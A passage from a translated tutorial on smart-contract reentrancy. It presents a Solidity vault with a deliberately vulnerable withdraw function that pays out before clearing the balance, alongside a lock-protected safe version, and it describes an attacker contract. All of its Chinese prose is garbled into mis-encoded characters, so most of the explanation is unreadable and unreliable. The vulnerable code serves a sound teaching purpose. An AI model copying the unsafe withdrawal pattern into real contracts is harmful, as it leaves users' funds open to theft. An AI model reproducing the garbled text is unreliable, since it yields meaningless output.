# é‡å…¥æ”»å‡»

Day: Day 20
ID: 20
åŸæ–‡: https://builder-hub.notion.site/FortKnox-Contract-1db5720a23ef80a4a303e3f1d63f8f3a?pvs=25
çŠ¶æ€: å®Œæˆ
è¯‘è€…: è¿æ¥ç«™ æœˆçƒ
éš¾åº¦ç­‰çº§: ä¸­çº§

ä½ å·²ç»è·¯è¡Œé•¿è¿œèµ°åˆ°ç°åœ¨è¿™é‡Œã€‚ä½ å­¦ä¼šäº†å¦‚ä½•ç¼–å†™æ™ºèƒ½åˆçº¦æ¥**ä¿å­˜èµ„é‡‘**ã€**é™åˆ¶è®¿é—®**ï¼Œç”šè‡³**æŠŠè¡Œä¸ºå§”æ‰˜ç»™å…¶å®ƒåˆçº¦**ã€‚

ä½ å³å°†è¿›å…¥æ™ºèƒ½åˆçº¦å®‰å…¨çš„çœŸæ­£æˆ˜åœºã€‚

# äº§å“éœ€æ±‚è¯´æ˜ä¹¦

## ç”¨æˆ·æµç¨‹

```mermaid
graph TD
    ç”¨æˆ·[/ç”¨æˆ·/] --> é‡‘åº“åˆçº¦[GoldVaulté‡‘åº“åˆçº¦]
    ç”¨æˆ· --> æ”»å‡»åˆçº¦[GoldThiefæ”»å‡»åˆçº¦]
    
    é‡‘åº“åˆçº¦ --> å­˜æ¬¾[depositå­˜æ¬¾]
    é‡‘åº“åˆçº¦ --> ä¸å®‰å…¨æå–[vulnerableWithdrawä¸å®‰å…¨æå–]
    é‡‘åº“åˆçº¦ --> å®‰å…¨æå–[safeWithdrawå®‰å…¨æå–]
    
    æ”»å‡»åˆçº¦ --> æ”»å‡»ä¸å®‰å…¨[attackVulnerableæ”»å‡»ä¸å®‰å…¨æå–]
    æ”»å‡»åˆçº¦ --> æ”»å‡»å®‰å…¨[attackSafeæ”»å‡»å®‰å…¨æå–]
    æ”»å‡»åˆçº¦ --> çªƒå–èµ„é‡‘[stealLootçªƒå–èµ„é‡‘]
    
    å­˜æ¬¾ --> ä½™é¢æ›´æ–°[æ›´æ–°ç”¨æˆ·ä½™é¢]
    
    ä¸å®‰å…¨æå– --> æ£€æŸ¥ä½™é¢{æ£€æŸ¥ç”¨æˆ·ä½™é¢}
    æ£€æŸ¥ä½™é¢ -->|ä½™é¢>0| è½¬è´¦ETH[å‘ç”¨æˆ·è½¬è´¦ETH]
    è½¬è´¦ETH --> æ¸…é›¶ä½™é¢[æ¸…é›¶ç”¨æˆ·ä½™é¢]
    
    å®‰å…¨æå– --> é‡å…¥é”æ£€æŸ¥{æ£€æŸ¥é‡å…¥é”çŠ¶æ€}
    é‡å…¥é”æ£€æŸ¥ -->|æœªé”å®š| è®¾ç½®é”å®š[è®¾ç½®é‡å…¥é”ä¸ºé”å®šçŠ¶æ€]
    è®¾ç½®é”å®š --> æ¸…é›¶ä½™é¢2[æ¸…é›¶ç”¨æˆ·ä½™é¢]
    æ¸…é›¶ä½™é¢2 --> è½¬è´¦ETH2[å‘ç”¨æˆ·è½¬è´¦ETH]
    è½¬è´¦ETH2 --> é‡Šæ”¾é”å®š[é‡Šæ”¾é‡å…¥é”]
    
    æ”»å‡»ä¸å®‰å…¨ --> å­˜å…¥èµ„é‡‘[å‘é‡‘åº“å­˜å…¥èµ„é‡‘]
    å­˜å…¥èµ„é‡‘ --> è°ƒç”¨ä¸å®‰å…¨æå–[è°ƒç”¨vulnerableWithdraw]
    è°ƒç”¨ä¸å®‰å…¨æå– --> æ¥æ”¶å‡½æ•°[receiveå‡½æ•°è§¦å‘]
    æ¥æ”¶å‡½æ•° --> é‡å…¥æ”»å‡»{æ£€æŸ¥æ”»å‡»æ¡ä»¶}
    é‡å…¥æ”»å‡» -->|æ»¡è¶³æ¡ä»¶| å†æ¬¡è°ƒç”¨æå–[å†æ¬¡è°ƒç”¨vulnerableWithdraw]
    å†æ¬¡è°ƒç”¨æå– --> æ¥æ”¶å‡½æ•°
    
    æ”»å‡»å®‰å…¨ --> å­˜å…¥èµ„é‡‘2[å‘é‡‘åº“å­˜å…¥èµ„é‡‘]
    å­˜å…¥èµ„é‡‘2 --> è°ƒç”¨å®‰å…¨æå–[è°ƒç”¨safeWithdraw]
    è°ƒç”¨å®‰å…¨æå– --> æ¥æ”¶å‡½æ•°2[receiveå‡½æ•°è§¦å‘]
    æ¥æ”¶å‡½æ•°2 --> å°è¯•é‡å…¥[å°è¯•å†æ¬¡è°ƒç”¨safeWithdraw]
    å°è¯•é‡å…¥ --> é‡å…¥è¢«é˜»æ­¢[é‡å…¥æ”»å‡»è¢«é˜»æ­¢]
    
    çªƒå–èµ„é‡‘ --> è½¬è´¦ç»™æ”»å‡»è€…[å°†åˆçº¦ä½™é¢è½¬ç»™æ”»å‡»è€…]
```

## æ•°æ®åº“

| Contract | Type | Bases |
| --- | --- | --- |
| **GoldVault** | Implementation |  |
| â”” goldBalance | Public | view |
| â”” deposit | Public â—ï¸ | ğŸ›‘ |
| â”” vulnerableWithdraw | Public â—ï¸ | ğŸ›‘ |
| â”” safeWithdraw | Public â—ï¸ | ğŸ›‘ |
| â”” nonReentrant | Modifier |  |
| **IVault** | Interface |  |
| â”” deposit | External |  |
| â”” vulnerableWithdraw | External |  |
| â”” safeWithdraw | External |  |
| **GoldThief** | Implementation | IVault |
| â”” targetVault | Public | view |
| â”” owner | Public | view |
| â”” attackCount | Public | view |
| â”” attackingSafe | Public | view |
| â”” attackVulnerable | Public â—ï¸ | ğŸ›‘ |
| â”” attackSafe | Public â—ï¸ | ğŸ›‘ |
| â”” receive | External | ğŸ›‘ |
| â”” stealLoot | Public â—ï¸ | ğŸ›‘ |
| â”” getBalance | Public â—ï¸ | view |

**å›¾ä¾‹è¯´æ˜ï¼š**

- â—ï¸ = å¯ä¿®æ”¹çŠ¶æ€
- ğŸ›‘ = å¯æ¥æ”¶ETH
- view = åªè¯»å‡½æ•°

# ç»†èŠ‚è§£é‡Š

è®©æˆ‘ä»¬æ¥è°ˆè°ˆä¸€ä¸ªè¿é«˜æ‰‹ä¹Ÿä¼šä¸­æ‹›çš„ç»å…¸é™·é˜±â€”â€”**é‡å…¥ï¼ˆreentrancyï¼‰**ã€‚

---

## ğŸ§  åœºæ™¯ï¼šæ•°å­—ç‰ˆè¯ºå…‹æ–¯å ¡

æƒ³è±¡ä½ åœ¨æ„å»ºä¸€ä¸ªè¶…å®‰å…¨çš„**æ•°å­—ä¿é™©åº“**â€”â€”æŠŠå®ƒå½“ä½œåŠ å¯†ä¸–ç•Œçš„è¯ºå…‹æ–¯å ¡ã€‚

ç”¨æˆ·å¯ä»¥æŠŠä»£å¸åŒ–çš„é»„é‡‘ï¼ˆæˆ– ETHï¼‰å­˜è¿›æ¥ï¼Œæƒ³å–å°±æ¥å–ã€‚ç›´è§‚ã€å¹²å‡€ã€ç®€å•ã€‚

ä½†éšåâ€¦â€¦

ä¸€ä¸ªèªæ˜çš„æ”»å‡»è€…å‡ºç°äº†ã€‚

Ta å‘ç°è¿™æ ·ä¸€ä¸ªç‚¹ï¼šå½“é‡‘åº“åœ¨æ‰§è¡Œæç°æ“ä½œæŠŠé»„é‡‘å‘å›ç»™æŸäººæ—¶â€”â€”å¹¶ä¸”é‡‘åº“æ²¡æœ‰æŠŠä½™é¢æ›´æ–°æ—¶â€”â€”æ”»å‡»è€…å¯ä»¥**å·å·å†è¿›å…¥**åˆçº¦å¹¶è¦æ±‚æ›´å¤šçš„èµ„é‡‘ã€‚

çªç„¶é—´ï¼ŒåŸæœ¬çš„ä¸€æ¬¡ 1 ETH æç°ï¼Œå˜æˆä¸€æ¬¡æ€§è¢«æ±²å–å‡º**å¤šå€ ETH**ã€‚

è¿™å°±æ˜¯è‡­åæ˜­è‘—çš„ **é‡å…¥æ”»å‡»**â€”â€”æ­£æ˜¯ 2016 å¹´ **DAOé»‘å®¢ æ”»å‡»**ä¸­å¯¼è‡´**æ•°åƒä¸‡ç¾å…ƒ**è¢«ç›—çš„é‚£ç±»æ¼æ´ã€‚

---

## ğŸ” é‚£ä¹ˆâ€œé‡å…¥â€åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ

æƒ³è±¡ä¸€å°è‡ªåŠ¨å”®è´§æœºã€‚

ä½ æŠ•å¸ã€æŒ‰é”®ã€ç­‰å¾…é›¶é£Ÿåå‡ºã€‚æœºå™¨å…ˆæ£€æŸ¥ä½ çš„ä½™é¢ï¼Œ**ç„¶å**ç»™å‡ºé›¶é£Ÿï¼Œ**æœ€å**æ›´æ–°ä½ çš„ä½™é¢ã€‚

ç°åœ¨æƒ³è±¡æœ‰ä¸ªç‹¡çŒ¾çš„æ¼æ´â€¦â€¦

å°±åœ¨æœºå™¨ç»™ä½ é›¶é£Ÿä¹‹åâ€”â€”**ä½†åœ¨**æ›´æ–°ä½™é¢**ä¹‹å‰**â€”â€”ä½ åˆæŒ‰äº†ä¸€æ¬¡æŒ‰é’®ã€‚ç„¶åå†æŒ‰ä¸€æ¬¡ã€‚å†æŒ‰ä¸€æ¬¡ã€‚

æ¯ä¸€æ¬¡ï¼Œæœºå™¨ä»ç„¶è®¤ä¸ºä½ æœ‰ä½™é¢â€¦â€¦å› ä¸ºå®ƒè¿˜æ²¡æ¥å¾—åŠæ›´æ–°ä½™é¢ã€‚

ç»“æœæ˜¯**æ— é™å…è´¹é›¶é£Ÿã€‚**

è¿™å°±æ˜¯æ™ºèƒ½åˆçº¦ä¸–ç•Œä¸­çš„ **é‡å…¥**ã€‚

---

## ğŸ•³ï¸ ä»£ç é‡Œåˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ

æŠŠå”®è´§æœºçš„æ•…äº‹ç¿»è¯‘æˆ Solidityï¼š

1. ä½ è°ƒç”¨åˆçº¦çš„ **withdraw**ï¼ˆæç°ï¼‰å‡½æ•°ã€‚
2. åˆçº¦ä½¿ç”¨ `.call{value: ...}()` ç»™ä½ å‘é€ ETHã€‚
3. ä½†ä½ â€”â€”å¾ˆç‹¡çŒ¾â€”â€”å†™äº†ä¸€ä¸ª **fallback**ï¼ˆå›é€€ï¼‰å‡½æ•°ï¼ˆä¸€ä¸ªæ¥æ”¶ ETH æ—¶ä¼šè‡ªåŠ¨è§¦å‘çš„å‡½æ•°ï¼‰ã€‚
4. åœ¨é‚£ä¸ªå›é€€é‡Œï¼Œä½ **å†æ¬¡è°ƒç”¨ withdraw**ã€‚
5. åŸåˆçº¦è¿˜æ²¡æ¥å¾—åŠæ›´æ–°ä½ çš„ä½™é¢â€¦â€¦æ‰€ä»¥å®ƒä»ç„¶è®¤ä¸ºä½ è¿˜æœ‰é’±å¯æ‹¿ã€‚
6. å®ƒåˆå‘é€äº†æ›´å¤š ETHã€‚
7. ä½ çš„å›é€€å†æ¬¡è°ƒç”¨ withdrawã€‚
8. å¦‚æ­¤åå¤â€¦â€¦ç›´åˆ°åˆçº¦è¢«æç©ºã€‚

---

## ğŸ” ä¸ºä»€ä¹ˆå« â€œReentrancyï¼ˆé‡å…¥ï¼‰â€ï¼Ÿ

å› ä¸ºä½ åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨å°šæœªç»“æŸå‰**å†æ¬¡è¿›å…¥**åŒä¸€ä¸ªå‡½æ•°ã€‚

è¯¥å‡½æ•°è¿˜åœ¨æ‰§è¡Œé‡è¦æ“ä½œï¼ˆä¾‹å¦‚æ›´æ–°ä½™é¢ï¼‰çš„ä¸€åŠæ—¶ï¼Œä½ ä»åé—¨æºœè¿›æ¥å†æ¬¡è¿è¡Œå®ƒâ€”â€”è€Œå®ƒä»åœ¨å·¥ä½œä¸­ã€‚

å°±åƒæ‰“å¼€é“¶è¡Œé‡‘åº“ï¼Œé€’ç»™äººé’±ï¼Œ**è¿˜æ²¡å…³ä¸Šé‡‘åº“é—¨**ï¼Œæœ‰äººåˆå†²è¿›æ¥è¦é’±â€”â€”ä¸€æ¬¡åˆä¸€æ¬¡ã€‚

---

## ğŸ”¨ ä½ å°†æ„å»ºä»€ä¹ˆï¼ˆåƒé»‘å®¢ä¸€æ ·è¡ŒåŠ¨ï¼‰

è¦çœŸæ­£ç†è§£é‡å…¥ï¼Œæˆ‘ä»¬ä¸ä¼šåªæ˜¯è§£é‡Šå®Œç†è®ºç„¶åè¿‡å»ã€‚

æˆ‘ä»¬è¦åšå¾—æ›´å¥½ã€‚

æˆ‘ä»¬å°†**æ„å»ºä¸€ä¸ªå¯è¿è¡Œçš„åˆçº¦**ï¼Œ**æ¨¡æ‹Ÿä¸€æ¬¡çœŸå®çš„é»‘å®¢æ”»å‡»**ï¼Œç„¶å**é€æ­¥ä¿®è¡¥æ¼æ´**ã€‚ä½ ä¼šä»å¼€å‘è€…â€¦â€¦å˜æˆé»‘å®¢â€¦â€¦å†å˜æˆé˜²å®ˆè€…â€”â€”ä¸€æ°”å‘µæˆã€‚

ä¸‹é¢åˆ†è§£æ­¥éª¤ã€‚

---

### ğŸ” `GoldVault.sol` â€“ ä½ çš„æ•°å­—è¯ºå…‹æ–¯å ¡

è¿™æ˜¯ä½ çš„ä¸»åˆçº¦â€”â€”é‡‘åº“ã€‚

- ç”¨æˆ·å¯ä»¥**å­˜å…¥ ETH**åˆ°é‡‘åº“ã€‚æŠŠå®ƒçœ‹ä½œå­˜å‚¨æ•°å­—é»„é‡‘ã€‚
- ä¹‹åï¼ŒTaä»¬å¯ä»¥éšæ—¶**æç°**è¿™äº›é»„é‡‘ã€‚
- æˆ‘ä»¬ä¼šå…ˆå®ç°ä¸€ä¸ª**åŸºç¡€çš„æç°å‡½æ•°**â€”â€”æ²¡æœ‰ä¿æŠ¤æªæ–½ã€æ²¡æœ‰é˜²æŠ¤ã€‚
- ç„¶åæˆ‘ä»¬ä¼šæ¼”ç¤ºæ”»å‡»è€…å¦‚ä½•**æ»¥ç”¨è¿™ä¸ªæ¼æ´**æ¥æç©ºåˆçº¦ã€‚
- åœ¨ä½ çœ‹åˆ°å®ƒè¢«æ”»ç ´åï¼Œæˆ‘ä»¬ä¼šç”¨ä¸€ä¸ªç®€å•ä½†å¼ºåŠ›çš„ `nonReentrant` ä¿®é¥°ç¬¦æ¥**é”å®šå®ƒ**â€”â€”è¿™æ˜¯ä¸€ä¸ªè‡ªåˆ¶çš„â€œå•æ¬¡è¿›å…¥â€å®‰å…¨é”ã€‚

æœ€ç»ˆï¼Œä½ çš„åˆçº¦å°†ä»â€œå¼€æ”¾â€å˜ä¸ºâ€œè¯ºå…‹æ–¯å ¡çº§åˆ«çš„å®‰å…¨â€ã€‚

---

### ğŸ¦¹â€â™‚ï¸ `GoldThief.sol` â€“ æ”»å‡»è€…åˆçº¦

è¿™ä¸ªå¾ˆæœ‰è¶£ã€‚ä½ å°†å®é™…æ‰®æ¼”åæ´¾ä¸€ä¼šå„¿ã€‚

- æ­¤åˆçº¦æ—¨åœ¨**åˆ©ç”¨ `GoldVault` è¿™ä¸ªåˆçº¦çš„å¼±ç‚¹**ã€‚
- å®ƒä¼šä½¿ç”¨ç‹¡çŒ¾çš„fallbackï¼ˆå›é€€ï¼‰å‡½æ•°**åœ¨æç°è¿‡ç¨‹ä¸­é‡å…¥é‡‘åº“**â€”â€”ä¸€æ¬¡åˆä¸€æ¬¡ã€‚
- ä½ ä¼šè¿‘è·ç¦»è§‚å¯Ÿè¿™æ¬¡æ”»å‡»ï¼šå®ƒæ˜¯å¦‚ä½•è¿ä½œã€å¦‚ä½•æŠ½èµ°èµ„é‡‘ï¼Œä»¥åŠé€Ÿåº¦æœ‰å¤šå¿«ã€‚
- ç„¶åâ€”â€”æˆ‘ä»¬åœ¨åº”ç”¨ä¿®å¤ç¨‹åºåè¿è¡Œæ”»å‡»â€¦â€¦å¹¶**çœ‹å®ƒå¤±è´¥**ã€‚

æ²¡æœ‰ä»€ä¹ˆæ¯”çœ‹ç€è‡ªå·±çš„åˆçº¦è¢«æ”»ç ´ç„¶åé˜»æ­¢æ”»å‡»è€…æ›´èƒ½æ•™ä¼šå®‰å…¨æ€§ã€‚

---

å®Œæˆåï¼Œä½ ä¸ä»…ä¼š*ç†è§£*é‡å…¥æ˜¯ä»€ä¹ˆâ€”â€”

ä½ ä¼šçŸ¥é“**å®ƒå¦‚ä½•å·¥ä½œ**ã€**å¦‚ä½•åˆ©ç”¨å®ƒ**ï¼Œä»¥åŠæœ€é‡è¦çš„**å¦‚ä½•é˜²èŒƒå®ƒ**ã€‚

è¿™å°†æŠŠä½ ä»åªä¼šå†™ Solidity å‡çº§ä¸ºä¼š**ä¿å« Solidity**çš„å¼€å‘è€…ã€‚

æˆ‘ä»¬å¼€å§‹æ„å»ºä½ çš„ç¬¬ä¸€ä¸ªæ•°å­—é‡‘åº“â€”â€”å¹¶æŠŠå®ƒå˜å¾—ç‰¢ä¸å¯ç ´ã€‚ğŸ”’

## ğŸ’° `GoldVault.sol` â€“ æ˜“å—æ”»å‡»ä¸å®‰å…¨çš„é‡‘åº“

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract GoldVault {
    mapping(address => uint256) public goldBalance;

    // Reentrancy lock setup
    uint256 private _status;
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    constructor() {
        _status = _NOT_ENTERED;
    }

    // Custom nonReentrant modifier â€” locks the function during execution
    modifier nonReentrant() {
        require(_status != _ENTERED, "Reentrant call blocked");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }

    function deposit() external payable {
        require(msg.value > 0, "Deposit must be more than 0");
        goldBalance[msg.sender] += msg.value;
    }

    function vulnerableWithdraw() external {
        uint256 amount = goldBalance[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "ETH transfer failed");

        goldBalance[msg.sender] = 0;
    }

    function safeWithdraw() external nonReentrant {
        uint256 amount = goldBalance[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        goldBalance[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "ETH transfer failed");
    }
}

```

è¿™ä¸ªåˆçº¦æ˜¯æˆ‘ä»¬è¯ºå…‹æ–¯å ¡å®éªŒçš„æ ¸å¿ƒã€‚

å®ƒåƒä¸€ä¸ªæ•°å­—é‡‘åº“â€”â€”ç”¨æˆ·å¯ä»¥**å­˜å…¥ ETH**ï¼Œå¹¶åœ¨ä¹‹å**æç°Taä»¬çš„ä½™é¢**ã€‚

ä½†æœ‰ä¸ªè½¬æŠ˜ï¼š

å®ƒæœ‰**ä¸¤ä¸ªæç°å‡½æ•°**â€”â€”ä¸€ä¸ª**æ˜“å—é‡å…¥æ”»å‡»**ï¼Œå¦ä¸€ä¸ªå·²ç»é€šè¿‡**è‡ªå®šä¹‰é”åŠ å›º**ã€‚

### åˆçº¦åŒ…å«ï¼š

- ä¸€ä¸ª `deposit()` å‡½æ•°ï¼Œå…è®¸ç”¨æˆ·å­˜ ETHã€‚
- ä¸€ä¸ª `vulnerableWithdraw()` å‡½æ•°â€”â€”è¿™å°±æ˜¯å‡ºé”™çš„åœ°æ–¹ã€‚å®ƒåœ¨æ›´æ–°ç”¨æˆ·ä½™é¢ä¹‹å‰å‘é€ ETHï¼Œç»™æ”»å‡»è€…ç•™ä¸‹å¯ä¹˜ä¹‹æœºã€‚
- ä¸€ä¸ª `safeWithdraw()` å‡½æ•°â€”â€”è¿™ä¸ªå‡½æ•°ä½¿ç”¨è‡ªåˆ¶çš„ `nonReentrant` ä¿®é¥°ç¬¦æ¥é˜»æ­¢ä»»ä½•é€’å½’æ”»å‡»å°è¯•ï¼Œå¹¶åœ¨æç°æœŸé—´å®‰å…¨åœ°é”ä½é‡‘åº“ã€‚

ä½ ä¼šçœ‹åˆ°åŒä¸€ä¸ªåˆçº¦åœ¨ä¸¤ç§æˆªç„¶ä¸åŒçš„è¡Œä¸ºä¸‹çš„è¡¨ç°â€”â€”ä»¥åŠä¸ºä»€ä¹ˆåœ¨ Solidity ä¸­æŒ‰**æ­£ç¡®é¡ºåº**å†™å®‰å…¨é€»è¾‘è‡³å…³é‡è¦ã€‚

æˆ‘ä»¬æ¥æ·±å…¥è§£æä»£ç ã€‚ğŸ‘‡

---

## ğŸ§±åˆçº¦è®¾ç½®

åœ¨æœ€ä¸Šæ–¹ï¼Œæˆ‘ä»¬å£°æ˜æ™ºèƒ½åˆçº¦ï¼š

```solidity

contract GoldVault {

```

è¿™æ˜¯æˆ‘ä»¬çš„é‡‘åº“â€”â€”ä¸€ä¸ªç®€å•çš„åˆçº¦ï¼Œç”¨æˆ·å¯ä»¥**å­˜å…¥** ETHï¼ˆçœ‹ä½œâ€œé»„é‡‘â€ï¼‰ï¼Œå¹¶åœ¨ä¹‹å**æç°**ã€‚ä½†åœ¨åº•å±‚ï¼Œæˆ‘ä»¬å¢åŠ äº†ä¸€ä¸ªé‡è¦çš„å®‰å…¨æœºåˆ¶ï¼Œåœ¨æœ‰äººä½¿ç”¨å®ƒæ—¶**æŠŠé—¨é”ä¸Š**â€”â€”ä»¥é˜²é‡å…¥æ”»å‡»ã€‚

æ¥ä¸‹æ¥çœ‹çœ‹å…³é”®çš„çŠ¶æ€å˜é‡ã€‚

---

### ğŸ—ƒï¸ çŠ¶æ€å˜é‡

```solidity

mapping(address => uint256) public goldBalance;

```

è¿™ä¸ªæ˜ å°„è®°å½•æ¯ä¸ªç”¨æˆ·åœ¨é‡‘åº“ä¸­å­˜äº†å¤šå°‘ ETHï¼ˆå³é»„é‡‘ï¼‰ã€‚

å½“ç”¨æˆ·è°ƒç”¨ `deposit()` æ—¶ï¼ŒTaä»¬çš„ä½™é¢ä¼šä¸Šå‡ã€‚

å½“Taä»¬è°ƒç”¨ `withdraw()` æ—¶ï¼Œä½™é¢ä¼šä¸‹é™ã€‚

---

ä¸‹é¢æ˜¯è®©æˆ‘ä»¬åˆçº¦èƒ½æŠµæŠ—é‡å…¥çš„é‚£éƒ¨åˆ†ï¼š

```solidity

uint256 private _status;
uint256 private constant _NOT_ENTERED = 1;
uint256 private constant _ENTERED = 2;

```

æˆ‘ä»¬æ¥æ‹†è§£ä¸€ä¸‹ï¼š

### ğŸ” é‡å…¥é”ç³»ç»Ÿ

- `_status` æ˜¯ä¸€ä¸ªç§æœ‰å˜é‡ï¼Œç”¨æ¥å‘Šè¯‰æˆ‘ä»¬æ•æ„Ÿå‡½æ•°ï¼ˆå¦‚ `safeWithdraw`ï¼‰æ˜¯å¦**æ­£åœ¨è¢«æ‰§è¡Œ**ã€‚
- `_NOT_ENTERED`ï¼ˆå€¼ä¸º `1`ï¼‰è¡¨ç¤ºï¼šã€Œå‡½æ•°å½“å‰æœªè¢«ä½¿ç”¨â€”â€”å¯ä»¥ä½¿ç”¨ã€ã€‚
- `_ENTERED`ï¼ˆå€¼ä¸º `2`ï¼‰è¡¨ç¤ºï¼šã€Œå·²ç»æœ‰äººåœ¨ä½¿ç”¨è¿™ä¸ªå‡½æ•°â€”â€”é˜»æ­¢å†æ¬¡ä½¿ç”¨ï¼ã€

åŸºæœ¬ä¸Šï¼Œæˆ‘ä»¬æ˜¯**ä¸ºè¯¥å‡½æ•°ä¸Šæ„å»ºä¸€ä¸ªæ•°å­—é”**ã€‚

åœ¨å…è®¸æŸäººæ‰§è¡Œåƒæç°è¿™æ ·æ•æ„Ÿçš„æ“ä½œä¹‹å‰ï¼Œæˆ‘ä»¬ä¼šæ£€æŸ¥ï¼š

> â€œè¿™ä¸ªå‡½æ•°å·²ç»æœ‰äººåœ¨æ‰§è¡Œäº†å—ï¼Ÿâ€
> 

å¦‚æœæ˜¯ï¼Œæˆ‘ä»¬**ç«‹å³é˜»æ­¢**ï¼Œä»¥é˜²ä»»ä½•å·å·çš„äºŒæ¬¡è¿›å…¥ã€‚

å¦‚æœä¸æ˜¯ï¼Œæˆ‘ä»¬**æŠŠå¼€å…³ç¿»åˆ° `_ENTERED`**ï¼Œåšå®Œå·¥ä½œï¼Œç„¶å**å†æŠŠå®ƒè®¾å› `_NOT_ENTERED`**ã€‚

è¿™ä¸ªé”åœ¨æˆ‘ä»¬çš„ `nonReentrant` ä¿®é¥°ç¬¦ä¸­è¢«æ¿€æ´»â€”â€”ç¨åæˆ‘ä»¬ä¼šçœ‹å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚

---

### ğŸ—ï¸ æ„é€ å‡½æ•°

```solidity

constructor() {
    _status = _NOT_ENTERED;
}

```

è¿™ä¼šè®¾ç½®é‡å…¥é˜²æŠ¤çš„åˆå§‹çŠ¶æ€ã€‚åˆçº¦éƒ¨ç½²æ—¶ï¼Œå®ƒå¤„äº `_NOT_ENTERED` çŠ¶æ€ã€‚

---

## ğŸ›¡ï¸ `nonReentrant` ä¿®é¥°ç¬¦ â€”â€” å®ˆé—¨è€…

```solidity

modifier nonReentrant() {
    require(_status != _ENTERED, "Reentrant call blocked");
    _status = _ENTERED;
    _;
    _status = _NOT_ENTERED;
}

```

è¿™ä¸ªä¿®é¥°ç¬¦æ˜¯ä¿æŠ¤åˆçº¦å…å—é‡å…¥æ”»å‡»çš„**æ ¸å¿ƒé˜²çº¿**ã€‚

æŠŠå®ƒæƒ³è±¡æˆ **â€œç¦æ­¢è¿›å…¥â€ æ ‡å¿—ï¼š**å½“æœ‰äººèµ°è¿›æˆ¿é—´æ—¶å®ƒç«‹åˆ»å‡èµ·çš„ï¼Œå¹¶ä¸”åªæœ‰ç­‰äººç¦»å¼€åæ‰ä¼šé™ä¸‹ã€‚

æˆ‘ä»¬ä¸€æ­¥æ­¥æ¥çœ‹çœ‹å®ƒå¦‚ä½•å·¥ä½œï¼š

---

### 1. **æ£€æŸ¥é”ï¼š**

```solidity

require(_status != _ENTERED, "Reentrant call blocked");

```

è¿™è¡Œè¡¨ç¤ºï¼š

> â€œæ˜¯å¦å·²ç»æœ‰äººåœ¨ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Ÿå¦‚æœæ˜¯â€”â€”ç«‹åˆ»åœæ­¢æ‰§è¡Œã€‚â€
> 

å¦‚æœ `_status` å·²ç»æ˜¯ `_ENTERED`ï¼Œè¯´æ˜å¦ä¸€æ¬¡è°ƒç”¨æ­£åœ¨è¿›è¡Œä¸­ã€‚è¿™å¯èƒ½æ˜¯é‡å…¥æ”»å‡»çš„è¿¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ revert **ç«‹åˆ»é”ä½å®ƒ**ã€‚

---

### 2. ä¸Š**é”ï¼š**

```solidity

_status = _ENTERED;

```

è¿™å°†å‡½æ•°çŠ¶æ€æ ‡è®°ä¸ºâ€œè¢«è°ƒç”¨â€ã€‚

æˆ‘ä»¬åŸºæœ¬ä¸Šæ˜¯åœ¨è¯´ï¼š

> â€œæˆ‘ä»¬è¿›å…¥äº†å‡½æ•°ä¸­â€”â€”æŠŠé—¨é”ä¸Šã€‚â€
> 

è¿™ä¼šé˜»æ­¢ä»»ä½•åµŒå¥—è°ƒç”¨å†æ¬¡è¿›å…¥ï¼Œç›´åˆ°æˆ‘ä»¬å®Œæˆå·¥ä½œã€‚

---

### 3. **æ‰§è¡Œå‡½æ•°é€»è¾‘ï¼š**

```solidity

_;

```

è¿™é‡Œæ˜¯å®é™…çš„å‡½æ•°ä½“æ‰§è¡Œä½ç½®â€”â€”æ— è®ºæ˜¯ `safeWithdraw()` è¿˜æ˜¯å…¶å®ƒå— `nonReentrant` ä¿æŠ¤çš„å‡½æ•°ã€‚Solidity ä¼šåœ¨æ‰§è¡Œæ—¶æŠŠ `_` æ›¿æ¢ä¸ºå‡½æ•°ä»£ç ã€‚

---

### 4. **è§£é”ï¼š**

```solidity

_status = _NOT_ENTERED;

```

ä¸€æ—¦æ‰€æœ‰äº‹æƒ…å®Œæˆâ€”â€”åœ¨æ‰€æœ‰ ETH è½¬è´¦å®Œæˆã€ä½™é¢æ›´æ–°å®Œæˆä¹‹åâ€”â€”æˆ‘ä»¬**é‡ç½®é”**ï¼Œä»¥ä¾¿æœªæ¥çš„è°ƒç”¨å¯ä»¥æ­£å¸¸è¿›è¡Œã€‚

---

### ğŸ§  ä¸ºä»€ä¹ˆè¿™æœ‰æ•ˆ

è¿™ä¸ªä¿®é¥°ç¬¦ç¡®ä¿**ä¸€æ¬¡åªæœ‰ä¸€ä¸ªè°ƒç”¨**å¯ä»¥è¿›å…¥å—ä¿æŠ¤çš„å‡½æ•°ã€‚

æ‰€ä»¥å³ä½¿å¤–éƒ¨åˆçº¦ï¼ˆä¾‹å¦‚æ”»å‡»è€…çš„fallbackå›é€€å‡½æ•°ï¼‰å°è¯•å›è°ƒé‡‘åº“â€”â€”å®ƒä¼šé‡åˆ°é”å¹¶**è¢«ç«‹å³é”å®š**ã€‚

è¿™æ˜¯ä¸€ä¸ªè¶…çº§ç®€å•ä½†è¶…çº§å¼ºå¤§çš„æ¨¡å¼â€”â€”å®ƒæ˜¯ä½ åœ¨Solidity ä¸­é˜²å¾¡é‡å…¥æ”»å‡»çš„ç¬¬ä¸€é“çœŸæ­£æŠ¤ç›¾ã€‚

---

## ğŸª™ deposit()

```solidity

function deposit() external payable {
    require(msg.value > 0, "Deposit must be more than 0");
    goldBalance[msg.sender] += msg.value;
}

```

ç®€å•ä¸”å®‰å…¨ã€‚

- ç”¨æˆ·æŠŠ ETH å‘åˆ°è¿™ä¸ªå‡½æ•°ã€‚
- ç”¨æˆ·ä½™é¢ä¼šå¢åŠ ã€‚
- åˆçº¦å°±æŒæœ‰äº†ç”¨æˆ·çš„èµ„é‡‘ï¼Œç›´åˆ°ç”¨æˆ·æç°ä¸ºæ­¢ã€‚

---

## âŒ `vulnerableWithdraw()` â€”â€” å“ªé‡Œå‡ºäº†é—®é¢˜

```solidity

function vulnerableWithdraw() external {
    uint256 amount = goldBalance[msg.sender];
